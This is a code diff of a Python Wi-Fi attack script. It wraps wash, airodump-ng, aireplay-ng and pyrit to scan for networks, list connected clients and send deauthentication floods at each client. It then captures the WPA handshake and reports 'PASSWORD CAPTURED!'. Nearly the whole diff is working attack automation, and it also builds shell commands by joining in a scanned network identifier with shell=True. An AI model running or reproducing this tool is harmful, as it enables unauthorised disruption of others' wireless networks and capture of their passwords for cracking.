@@ -8,9 +8,6 @@ from os import system
 from colorama import Fore,Style
 import csv
 
-# Variables
-ROOT = 'sudo'
-
 # Functions
 def welcome():
     print(Fore.BLUE)
@@ -186,27 +183,26 @@ def readFile():
     print(networks)
     choice  = int(input('Select a network: '))
     print('Selected:',networks[choice])
-    attack(networks[choice])
+    # attack(networks[choice], None)
 # -------------------------------------------------------------------------------------------------------------
 
 # Find target using Wash doesn't make any files - All-in-One, clean function
 def findTargetWash():
-    # Local variables
+    # Local variables3
     networks = {}
     count = 0
     # Command list
     command = ['wash','-a','-i',getInterface(0)]
     # Run command using subprocess 
     process_Wash = sp.Popen(command, stdout=sp.PIPE ,text=True)
-    # Sleep for about 26 seconds
+    # Sleep for about 24 seconds
+    print(Fore.LIGHTRED_EX,'Scanning for networks...(24sec)')
     t.sleep(2)
-    print(Fore.RED,'Scanning for networks...(24sec)')
+    print(Fore.RED,'Scanning for networks...(22sec)')
     t.sleep(2)
-    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...(22sec)')
+    print(Fore.MAGENTA,'Scanning for networks...(20sec)')
     t.sleep(2)
-    print(Fore.YELLOW,'Scanning for networks...(20sec)')
-    t.sleep(2)
-    print(Fore.LIGHTGREEN_EX,'Scanning for networks...(18sec)')
+    print(Fore.YELLOW,'Scanning for networks...(18sec)')
     t.sleep(2)
     print(Fore.GREEN,'Scanning for networks...(16sec)')
     t.sleep(2)
@@ -218,13 +214,13 @@ def findTargetWash():
     t.sleep(2)
     print(Fore.GREEN,'Scanning for networks...(8sec)')
     t.sleep(2)
-    print(Fore.LIGHTGREEN_EX,'Scanning for networks...(6sec)')
+    print(Fore.YELLOW,'Scanning for networks...(6sec)')
     t.sleep(2)
-    print(Fore.YELLOW,'Scanning for networks...(4sec)')
+    print(Fore.MAGENTA,'Scanning for networks...(4sec)')
     t.sleep(2)
-    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...(2sec)')
+    print(Fore.RED,'Scanning for networks...(2sec)')
     t.sleep(2)
-    print(Fore.RED,'Scanning for networks...(0sec)')
+    print(Fore.LIGHTRED_EX,'Scanning for networks...(0sec)')
     # Send keyboard interrupt | CTRL+C equivalent
     process_Wash.send_signal(signal.SIGINT)
     # Export output of command to list split by newline
@@ -257,8 +253,8 @@ def findTargetWash():
             # Print the list of scanned networks
             print(Fore.BLUE, '| ', Fore.WHITE, count, ' ', BSSID, '      ', Power, '                ', Channel, '        ', ESSID, Fore.BLUE,'      |',Style.RESET_ALL)
             print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
-    choice  = int(input('Select a network: '))
-    print('Selected:',networks[choice])
+    choice  = int(input(' Select a network: '))
+    print(' Selected:',networks[choice])
     # attack(networks[choice])
     findClients(networks[choice])
 
@@ -267,106 +263,114 @@ def findClients(target):
     BSSID = target[0]
     Channel = target[1]
     Name = target[3]
-    fileName = 'clients/clients_'+Name
+    fileName = 'clients/clients_'+BSSID+'_'+Name
     interface = getInterface(0)
+    clients = {}
+    count = 0
     # Commands - airodump-ng: capture clients & aireplay-ng: deauth network
     command_1 = ['airodump-ng', '-K', '1', '-c', Channel, '--bssid', BSSID, '-w', fileName, '--output-format', 'csv', interface]
     command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
     # Run command - airodump-ng: save output to CSV file in 'clients' directory  
     process = sp.Popen(command_1, stdout=sp.PIPE, text=True)
     # Run both processes for about 30 seconds
-    print(Fore.YELLOW, 'Searching for clients...(30sec)')
+    print(Fore.RED, 'Searching for clients...(30sec)')
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(27sec)')
+    print(Fore.MAGENTA, 'Searching for clients...(27sec)')
     t.sleep(3)
     print(Fore.YELLOW, 'Searching for clients...(24sec)')
     sp.run(command_2, stdout=sp.DEVNULL)
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(21sec)')
+    print(Fore.GREEN, 'Searching for clients...(21sec)')
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(18sec)')
+    print(Fore.CYAN, 'Searching for clients...(18sec)')
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(15sec)')
-    sp.run(command_2, stdout=sp.DEVNULL)
+    print(Fore.BLUE, 'Searching for clients...(15sec)')
+    # sp.run(command_2, stdout=sp.DEVNULL)
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(12sec)')
+    print(Fore.CYAN, 'Searching for clients...(12sec)')
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(9sec)')
+    print(Fore.GREEN, 'Searching for clients...(9sec)')
     t.sleep(3)
     print(Fore.YELLOW, 'Searching for clients...(6sec)')
     sp.run(command_2, stdout=sp.DEVNULL)
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(3sec)')
+    print(Fore.MAGENTA, 'Searching for clients...(3sec)')
     t.sleep(3)
-    print(Fore.YELLOW, 'Searching for clients...(0sec)')
+    print(Fore.RED, 'Searching for clients...(0sec)')
     # Send CTRL+C to process
     process.send_signal(signal.SIGINT)
 
     # ---------- Find client file ----------
-    process = sp.run(['ls', 'clients'], capture_output=True, text=True)
+    process = sp.run(['ls clients | grep '+BSSID], capture_output=True, text=True, shell=True)
     ls = process.stdout.splitlines()
-    print(ls)
-    print('size of list:', ls.__len__())
-    for f in ls:
-        print(f)
-    if ls.__len__() > 1:
-        # ls.remove(ls[0])
-        sp.run(['rm','clients/'+ls[0]])
-        print(Fore.YELLOW, 'Warning: more than one client file!') # This should never be displayed
-    print(ls)
+    # Get the latest client file
+    clientfile = 'clients/' + ls[-1]
+
+    # ---------- Parse clients ----------
+    with open(clientfile, 'r') as csvfile: 
+        # creating a csv reader object 
+        csvreader = csv.reader(csvfile) 
+        # print header
+        # print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
+        for row in csvreader:
+            # skip empty rows
+            if not row:
+                continue
+            # skip first row
+            elif row.__contains__('BSSID'):
+                continue
+            # skip second row
+            elif row.__contains__('Station MAC'):
+                continue
+            # # display and put networks in a dictionary that conatins a list of properties
+            else:
+                count += 1
+                clients[count] = row[0]
+    print(Fore.GREEN,'Found {} client(s) connected to {}'.format(count, Name))
+    attack(target,clients)
     
-def attack(target):
+    
+def attack(target, clients):
     # internal variables - BSSID, Channel, Name, & fileName
     BSSID = target[0]
     Channel = target[1]
     Name = target[3]
-    fileName = 'captures/capture_'+Name
+    fileName = 'captures/capture_'+BSSID+'_'+Name
     interface = getInterface(0)
 
     # Commands - airodump-ng: capture data & aireplay-ng: deauth network
-    command_1 = ['airodump-ng','-K','1','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
-    command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
-
+    command_1 = ['airodump-ng', '-K', '1', '-c', Channel, '--bssid', BSSID, '-w', fileName, '--output-format', 'cap', interface]
     # Run command - airodump-ng: output hidden
     process_1 = sp.Popen(command_1, stdout=sp.DEVNULL)
     print(Fore.YELLOW,'Listening...')
     t.sleep(2)
-    # Run command - aireplay-ng: output hidden
-    sp.run(command_2, stdout=sp.DEVNULL)
-
-    t.sleep(2)
-    print(Fore.RED,'Attacking network...')
-    t.sleep(2)
-    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
-    t.sleep(2)
-    print(Fore.YELLOW,'Attacking network...')
-    t.sleep(2)
-    print(Fore.LIGHTGREEN_EX,'Attacking network...')
-    t.sleep(2)
-    sp.run(command_2)
-    print(Fore.GREEN,'Attacking network...')
-    t.sleep(2)
-    print(Fore.CYAN,'Attacking network...')
-    t.sleep(2)
-    print(Fore.BLUE,'Attacking network...')
-    t.sleep(2)
-    print(Fore.CYAN,'Attacking network...')
-    t.sleep(2)
-    print(Fore.GREEN,'Attacking network...')
-    t.sleep(2)
-    sp.run(command_2)
-    print(Fore.LIGHTGREEN_EX,'Attacking network...')
-    t.sleep(2)
-    print(Fore.YELLOW,'Attacking network...')
-    t.sleep(2)
-    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
-    t.sleep(2)
-    print(Fore.RED,'Attacking network...')
-    
-    # Send CTRL+C to process
+    for i in range(1,clients.__len__()):
+        sp.run(['aireplay-ng', '--deauth', '5', '-c', clients[i], '-a', BSSID, interface], stdout=sp.DEVNULL)
+        print(Fore.RED, 'Attacking network...')
+        t.sleep(3)
     process_1.send_signal(signal.SIGINT)
+    print(Fore.YELLOW, 'Checking handshake')
+    verifyHandshake(BSSID)
+    t.sleep(2)
+    # TODO: verifyHandshake() 
 
-    # TODO: Add handshake captured printout
+def verifyHandshake(BSSID):
+    # --------- Find handshake capture file ---------
+    process = sp.run(['ls captures | grep '+BSSID], capture_output=True, text=True, shell=True)
+    ls = process.stdout.splitlines()
+    # Get the latest handshake file
+    handshakeFile = 'captures/' + ls[-1]
+    # --------- Verify handshake ---------
+    command = ['pyrit', '-r', handshakeFile, 'analyze']
+    process_1 = sp.run(command, capture_output=True, text=True)
+    pyrit = process_1.stdout
+    if pyrit.__contains__('good'):
+        print(Fore.LIGHTGREEN_EX, '\n+--------------------+')
+        print(Fore.LIGHTGREEN_EX, '| PASSWORD CAPTURED! |')
+        print(Fore.LIGHTGREEN_EX, '+--------------------+\n')
+        monitorToggle(getInterface(0),1)
+    else:
+        print(Fore.LIGHTYELLOW_EX,'Password not captured, likely not enough clients connected - try again with another network')
 
 
 def start():
@@ -375,11 +379,11 @@ def start():
 
 # Main function calls
 welcome()       # prints title
-# start()         # Start the process/function/procedure tree
+start()         # Start the process/function/procedure tree
 
 # -------SANDBOX--------
 # readFile()
 
 # monitorToggle(getInterface(0),1)
 
-findTargetWash()
+# findTargetWash()
